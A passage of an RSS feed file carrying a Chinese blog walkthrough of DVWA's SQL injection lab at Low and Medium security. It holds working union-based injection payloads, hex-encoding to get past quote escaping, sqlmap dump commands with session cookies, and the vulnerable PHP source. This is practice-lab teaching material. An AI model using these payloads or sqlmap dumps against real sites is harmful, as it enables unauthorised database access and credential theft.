@@ -1,0 +1,712 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>SQL注入 on 知识带给我们自由</title>
+    <link>https://yuexuan521.github.io/zh/tags/sql%E6%B3%A8%E5%85%A5/</link>
+    <description>Recent content in SQL注入 on 知识带给我们自由</description>
+    <image>
+      <title>知识带给我们自由</title>
+      <url>https://yuexuan521.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
+      <link>https://yuexuan521.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
+    </image>
+    <generator>Hugo -- 0.153.2</generator>
+    <language>zh</language>
+    <copyright>See this site&amp;rsquo;s source code here, licensed under GPLv3 ·</copyright>
+    <lastBuildDate>Thu, 26 Sep 2024 12:25:03 +0000</lastBuildDate>
+    <atom:link href="https://yuexuan521.github.io/zh/tags/sql%E6%B3%A8%E5%85%A5/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>网络安全 DVWA通关指南 SQL Injection(SQL注入)</title>
+      <link>https://yuexuan521.github.io/zh/post/dvwa%E9%9D%B6%E5%9C%BA/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-dvwa%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97-sql-injectionsql%E6%B3%A8%E5%85%A5/</link>
+      <pubDate>Thu, 26 Sep 2024 12:25:03 +0000</pubDate>
+      <guid>https://yuexuan521.github.io/zh/post/dvwa%E9%9D%B6%E5%9C%BA/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-dvwa%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97-sql-injectionsql%E6%B3%A8%E5%85%A5/</guid>
+      <description>&lt;h2 id=&#34;dvwasqlinjection&#34;&gt;DVWASQLInjection&lt;/h2&gt;
+&lt;p&gt;&lt;img alt=&#34;在这里插入图片描述&#34; loading=&#34;lazy&#34; src=&#34;https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735688.jpeg&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;参考文献&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.cnblogs.com/linfangnan/p/13994655.html#dvwa-%E9%9D%B6%E5%9C%BA&#34;&gt;WEB 安全靶场通关指南&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;SQL注入漏洞基本原理&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Web应用程序对用户输入的数据校验处理不严或者根本没有校验，致使用户可以拼接执行SQL命令。&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h2 id="dvwasqlinjection">DVWASQLInjection</h2>
+<p><img alt="在这里插入图片描述" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735688.jpeg"></p>
+<hr>
+<p>参考文献</p>
+<ul>
+<li><a href="https://www.cnblogs.com/linfangnan/p/13994655.html#dvwa-%E9%9D%B6%E5%9C%BA">WEB 安全靶场通关指南</a></li>
+</ul>
+<hr>
+<blockquote>
+<p><strong>SQL注入漏洞基本原理</strong></p>
+<p>Web应用程序对用户输入的数据校验处理不严或者根本没有校验，致使用户可以拼接执行SQL命令。</p>
+<p>可能导致数据泄露或数据破坏，缺乏可审计性，甚至导致完全接管主机。</p>
+<p><strong>根据注入技术分类有以下五种：</strong></p>
+<blockquote>
+<p>布尔型盲注：根据返回页面判断条件真假</p>
+<p>时间型盲注：用页面返回时间是否增加判断是否存在注入</p>
+<p>基于错误的注入：页面会返回错误信息</p>
+<p>联合查询注入：可以使用union的情况下</p>
+<p>堆查询注入：可以同时执行多条语句</p>
+</blockquote>
+<p><strong>防御方法</strong></p>
+<p>使用参数化查询。</p>
+<p>数据库服务器不会把参数的内容当作 <code>SQL</code> 指令的一部分来拼接执行；</p>
+<p>而是在数据库完成 <code>SQL</code> 指令的编译后才套用参数运行(预编译)。</p>
+<p>避免数据变成代码被执行，时刻分清代码和数据的界限。</p>
+</blockquote>
+<h3 id="low">Low</h3>
+<p><strong>一、判断提交方式</strong></p>
+<p>在User ID中输入数字1，提交后发现，在URL地址栏出现了提交的参数，由此可以判断提交方式为get方式。</p>
+<p>提问：get和post提交方式对SQL注入的实施有什么影响？</p>
+<p><img alt="image-20240408153605723" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735689.png"></p>
+<p><strong>二、判断服务器处理类型（数字型或字符型）</strong></p>
+<p>加单引号，提交 <code>1'</code> ，出现报错信息，显示多出一个单引号，可以确定为字符型注入</p>
+<p><img alt="image-20240411212414415" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735690.png"></p>
+<p><strong>三、判断注入点</strong></p>
+<p>提交 <code>1' or 1=1#</code> 语句，结果返回了全部的内容，可以判断存在注入点</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; or 1=1#
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="image-20240411213036653" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735691.png"></p>
+<p><strong>四、判断列数</strong></p>
+<p>使用 <code>order by</code> 语句判断目标数据库表中的列数，依次提交 <code>1' order by 1#</code> 语句，数字从大到小，当出现报错信息后确定列数。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; order by 1#
+</span></span></span><span class="line"><span class="cl"><span class="s1">1&#39;</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">2</span><span class="o">#</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; order by 3# 
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="image-20240411214439810" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735692.png"></p>
+<p><img alt="image-20240411214409610" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735693.png"></p>
+<p><img alt="image-20240411214320827" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735694.png"></p>
+<p>当提交 <code>1' order by 3#</code> 时出现报错信息，说明目标数据库表中的列数为2</p>
+<p><strong>五、提取库名、表名、字段名、值</strong></p>
+<p>1、提取库名</p>
+<p>依据前一步得到的列数构建注入语句，得到数据库名dvwa</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; union select 1,database()#
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="image-20240411214816515" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735695.png"></p>
+<p>2、提取表名</p>
+<p>通过注入攻击来获取名为’dvwa’的数据库中的所有表名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; union select 1,table_name from information_schema.tables where table_schema=&#39;</span><span class="n">dvwa</span><span class="s1">&#39;#
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">//information_schema 是一个特殊的系统数据库，其中包含了所有用户创建的数据库以及这些数据库中的表的信息。tables 表提供了关于所有表的详细信息，如表名、表类型等。
+</span></span></span><span class="line"><span class="cl"><span class="s1">//&#34;1,table_name&#34;中的&#39;</span><span class="mi">1</span><span class="s1">&#39;是一个占位符，用于模拟与原始查询返回相同数量的列，以便UNION操作成功执行。
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>当提交注入语句时，可能出现如下错误信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Illegal mix of collations for operation &#39;UNION&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="image-20240411220050884" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735696.png"></p>
+<p>这是由于MySQL在执行 <code>UNION</code> 操作时遇到的不同字符集之间的冲突报错。</p>
+<p>解决方法：打开CMD，登录MySQL的dvwa数据库，修改first_name和last_name字段的字符集</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">alter</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">modify</span><span class="w"> </span><span class="n">first_name</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span><span class="w"> </span><span class="k">character</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="n">utf8</span><span class="w"> </span><span class="k">collate</span><span class="w"> </span><span class="n">utf8_general_ci</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">alter</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">modify</span><span class="w"> </span><span class="n">last_name</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span><span class="w"> </span><span class="k">character</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="n">utf8</span><span class="w"> </span><span class="k">collate</span><span class="w"> </span><span class="n">utf8_general_ci</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">将</span><span class="n">first_name和last_name字段的字符集都设置为了utf8</span><span class="err">，并指定了排序规则为</span><span class="n">utf8_general_ci</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>修改完毕后，命令执行成功</p>
+<p><img alt="image-20240411221106229" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735697.png"></p>
+<p>3、提取字段名</p>
+<p>通过注入攻击获取数据库中特定表（本例中为 <code>users</code> 表）的所有字段名。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; union select 1,column_name from information_schema.columns where table_name=&#39;</span><span class="n">users</span><span class="s1">&#39;#
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="image-20240412083706100" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735698.png"></p>
+<p>4、提取值</p>
+<p>从数据库表 <code>users</code> 中提取 <code>user</code> 和 <code>password</code> 字段的数据</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; union select user,password from users#
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行命令出现同样的字符编码问题，解决方法还是修改字段的字符集</p>
+<p><img alt="image-20240412083801374" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735699.png"></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">alter</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">modify</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span><span class="w"> </span><span class="k">character</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="n">utf8</span><span class="w"> </span><span class="k">collate</span><span class="w"> </span><span class="n">utf8_general_ci</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">alter</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">modify</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span><span class="w"> </span><span class="k">character</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="n">utf8</span><span class="w"> </span><span class="k">collate</span><span class="w"> </span><span class="n">utf8_general_ci</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行成功得到用户和密码的数据，密码为32位小写MD5，可以通过 <a href="https://www.cmd5.com/default.aspx">在线工具</a> 解密</p>
+<p><img alt="image-20240412084253957" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735700.png"></p>
+<p><img alt="image-20240412111534464" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735701.png"></p>
+<p><strong>六、SQLmap工具使用</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="image-20240412103446366" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735702.png"></p>
+<p><img alt="image-20240412103645411" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735703.png"></p>
+<p><img alt="image-20240412104023272" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735704.png"></p>
+<p>1、提取库名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low&#34; --dbs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="image-20240412104144581" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735705.png"></p>
+<p>2、提取表名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low&#34; -D dvwa --tables
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="image-20240412104236250" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735706.png"></p>
+<p>3、提取字段名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low&#34; -D dvwa -T users --columns
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="image-20240412104324776" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735707.png"></p>
+<p>4、提取值</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=i0ssj777jur6gqb9af6bd111tn; security=low&#34; --batch -D dvwa -T users -C user,password --dump
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="image-20240603085905398" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735708.png"></p>
+<p><strong>七、分析后台脚本</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) {
+</span></span><span class="line"><span class="cl">	// Get input
+</span></span><span class="line"><span class="cl">	$id = $_REQUEST[ &#39;id&#39; ];
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Check database
+</span></span><span class="line"><span class="cl">	$query  = &#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&#34;;
+</span></span><span class="line"><span class="cl">	$result = mysqli_query($GLOBALS[&#34;___mysqli_ston&#34;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&#34;___mysqli_ston&#34;])) ? mysqli_error($GLOBALS[&#34;___mysqli_ston&#34;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	// Get results
+</span></span><span class="line"><span class="cl">	while( $row = mysqli_fetch_assoc( $result ) ) {
+</span></span><span class="line"><span class="cl">		// Get values
+</span></span><span class="line"><span class="cl">		$first = $row[&#34;first_name&#34;];
+</span></span><span class="line"><span class="cl">		$last  = $row[&#34;last_name&#34;];
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		// Feedback for end user
+</span></span><span class="line"><span class="cl">		$html .= &#34;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&#34;;
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	mysqli_close($GLOBALS[&#34;___mysqli_ston&#34;]);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// 检查是否有&#34;Submit&#34;按钮被点击
+</span></span><span class="line"><span class="cl">if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) {
+</span></span><span class="line"><span class="cl">        // 获取用户输入的ID
+</span></span><span class="line"><span class="cl">        $id = $_REQUEST[ &#39;id&#39; ];
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        // 构建SQL查询语句
+</span></span><span class="line"><span class="cl">        $query  = &#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&#34;;
+</span></span><span class="line"><span class="cl">        // 执行SQL查询
+</span></span><span class="line"><span class="cl">        $result = mysqli_query($GLOBALS[&#34;___mysqli_ston&#34;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&#34;___mysqli_ston&#34;])) ? mysqli_error($GLOBALS[&#34;___mysqli_ston&#34;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">        // 处理查询结果
+</span></span><span class="line"><span class="cl">        while( $row = mysqli_fetch_assoc( $result ) ) {
+</span></span><span class="line"><span class="cl">                // 获取查询结果中的名字和姓氏
+</span></span><span class="line"><span class="cl">                $first = $row[&#34;first_name&#34;];
+</span></span><span class="line"><span class="cl">                $last  = $row[&#34;last_name&#34;];
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">                // 拼接输出结果
+</span></span><span class="line"><span class="cl">                $html .= &#34;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&#34;;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">        // 关闭数据库连接
+</span></span><span class="line"><span class="cl">        mysqli_close($GLOBALS[&#34;___mysqli_ston&#34;]);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="medium">Medium</h3>
+<p>1、修改电脑代理服务器IP设置为127.0.0.1，端口设置为8888，Bur调整代理参数与电脑代理一致</p>
+<p><img alt="image-20240412094734133" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735710.png"></p>
+<p><img alt="image-20240412095237028" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735711.png"></p>
+<p><img alt="image-20240412094536046" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735712.png"></p>
+<p>2、在DVWA中尝试提交一个ID，在BurpSuite的repeater中查看捕获到的提交信息。使用BurpSuite的repeater模块可以重复发送数据，查看返回数据。</p>
+<p><img alt="image-20240412095327893" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735713.png"></p>
+<p><img alt="image-20240412095418437" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735714.png"></p>
+<p><img alt="image-20240412095516476" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735715.png"></p>
+<p><img alt="image-20240412095727503" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735716.png"></p>
+<p>3、确认列数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">4 order by 1#
+</span></span><span class="line"><span class="cl">4 order by 2#
+</span></span><span class="line"><span class="cl">4 order by 3#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="image-20240412095859327" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735717.png"></p>
+<p><img alt="image-20240412095934153" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735718.png"></p>
+<p>4、库、表、字段、值</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">4 union select 1,database()#
+</span></span><span class="line"><span class="cl">//得到库名
+</span></span><span class="line"><span class="cl">4 union select 1,table_name from information_schema.tables where table_schema=0x64767761#
+</span></span><span class="line"><span class="cl">//得到表名
+</span></span><span class="line"><span class="cl">4 union select 1,column_name from information_schema.columns where table_schema=0x64767761 and table_name=0x7573657273#
+</span></span><span class="line"><span class="cl">//得到字段
+</span></span><span class="line"><span class="cl">4 union select user,password from users#
+</span></span><span class="line"><span class="cl">//得到值
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>提取库名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">4 union select 1,database()#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="image-20240412101400469" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735719.png"></p>
+<p>提取表名</p>
+<p>注入语句发现单引号被转义，使用BurpSuite的Decoder模块，将 <code>'dvwa'</code> 转为16进制，自行添加 <code>0x</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">4 union select 1,table_name from information_schema.tables where table_schema=&#39;dvwa&#39;#
+</span></span><span class="line"><span class="cl">4 union select 1,table_name from information_schema.tables where table_schema=0x64767761#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="image-20240412101948084" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735720.png"></p>
+<p><img alt="image-20240412102504354" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735721.png"></p>
+<p><img alt="image-20240412102654211" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735722.png"></p>
+<p>提取字段名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">4 union select 1,column_name from information_schema.columns where table_schema=0x64767761 and table_name=0x7573657273#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="image-20240412102804247" loading="lazy" src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735723.png"></p>
+<p>提取user、password的值</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
